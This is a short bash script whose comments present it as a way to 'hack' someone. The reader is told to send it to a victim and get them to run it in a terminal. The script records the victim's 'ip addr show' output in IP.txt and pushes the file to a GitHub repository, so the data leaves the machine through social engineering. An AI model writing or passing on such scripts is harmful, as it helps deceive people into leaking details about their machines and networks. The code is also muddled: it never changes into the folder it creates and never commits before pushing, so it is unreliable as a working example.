#! /usr/bin/bash

# Now make sure that the person you're hacking has a Github account and has an empty repository.
# Change REPO_NAME_HERE to the name of the empty repository.
mkdir REPO_NAME_HERE

git init

ip addr show >> IP.txt

git add .

# Change exampleforusername's text to say the name of the Github username that your are trying to hack
# and change exampleforrepository's text to the name of the empty repository.
git remote add origin https://github.com/exampleforusername/exampleforrepository

git push -u origin main

# Done! Now make sure that you send this script to the person you're trying to hack and make them run it in they're terminal.
